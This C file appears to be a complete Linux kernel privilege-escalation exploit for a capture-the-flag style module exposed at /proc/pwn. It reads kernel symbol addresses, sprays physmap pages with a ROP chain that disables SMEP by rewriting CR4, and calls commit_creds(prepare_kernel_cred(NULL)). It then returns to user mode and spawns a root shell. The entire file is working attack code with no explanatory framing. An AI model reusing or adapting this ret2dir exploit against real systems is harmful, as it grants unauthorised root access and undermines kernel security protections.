#include<stdio.h>
#include<stdlib.h>
#include<sys/ioctl.h>
#include<sys/mman.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>
size_t ko_offset=0xffffffffc0000000;
size_t vm_offset=0;
size_t *prepare_kernel_cred_ptr=0;
size_t *commit_creds_ptr=0;
size_t prepare_kernel_cred=0;
size_t commit_creds=0;
size_t page_size=0;
#define  SWAPGS_POPFQ_RET        0x0
#define  IRETQ_RET               0x5
#define  MOV_CR4_RDI_RET         0xa
#define  POP_RDI_RET             0x8
#define  RET                     0x4
#define  ADD_RSP_0X320_RET       0x14


size_t  *physmap_spray_arr[16000];
void get_shell(){
	if (getuid()){
		puts("fail, no root");
	}
	else{
		__asm__	(
				"pop rax;"
			);

		system("/bin/sh");
	}
	exit(0);
}
void get_root(){
	void * (*prepare_kernel_cred_ptr)(void *) = (void *)prepare_kernel_cred;
	int (*commit_creds_ptr)(void *) = (void *)commit_creds;
	(*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
void read_sym(){

	FILE* sym_table_fd = fopen("/tmp/kallsyms", "r");
	if(sym_table_fd < 0)
	{
		printf("[x] Failed to open the sym_table file!\n");
		exit(-1);
	}
	char buf[0x50], type[0x10];
	size_t addr;
	while(fscanf(sym_table_fd, "%llx%s%s", &addr, type, buf))
	{
		if(prepare_kernel_cred && commit_creds)
			break;

		if(!commit_creds && !strcmp(buf, "commit_creds"))
		{
			commit_creds = addr;
			printf("[+] commit_cread: 0x%llx\n", commit_creds);
			continue;
		}

		if(!strcmp(buf, "prepare_kernel_cred"))
		{
			prepare_kernel_cred = addr;
			printf("[+] prepare_kernel_cred: 0x%llx\n", prepare_kernel_cred);
			continue;
		}
	}

}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__(
			"mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
	       );
}
void write_rop_chain(size_t *rop)
{
	int i=0;

	for (; i < (page_size / 8 - 0x30); i++)
		rop[i] = ADD_RSP_0X320_RET+ko_offset;
	for (; i < (page_size / 8 - 0x10); i++)
		rop[i] =RET+ko_offset;
	rop[i++]=POP_RDI_RET+ko_offset;
	rop[i++]=0x6f0;
	rop[i++]=MOV_CR4_RDI_RET+ko_offset;
	rop[i++]=(size_t)get_root;
	rop[i++]=SWAPGS_POPFQ_RET+ko_offset;
	rop[i++]=0;
	rop[i++]=IRETQ_RET+ko_offset;
	rop[i++]=(size_t)get_shell;
	rop[i++]=user_cs;
	rop[i++]=user_rflags;
	rop[i++]=user_sp;
	rop[i++]=user_ss;

}

int main(){
	save_status();
	read_sym();
	size_t try_hit=0;
	page_size = sysconf(_SC_PAGESIZE);

	physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	write_rop_chain(physmap_spray_arr[0]);

	puts("[*] Spraying physmap...");
	for (int i = 1; i < 12000; i++)
	{
		physmap_spray_arr[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (!physmap_spray_arr[i])
		{
			printf("oom\n");
			exit(1);
		}
		memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
	}

	puts("[*] trigger physmap one_gadget...");

	try_hit = 0xffff888000000000 +  0x4000f00;

	size_t rop[24]={0};
	int fd=open("/proc/pwn",2);
	ioctl(fd,0,try_hit);
}

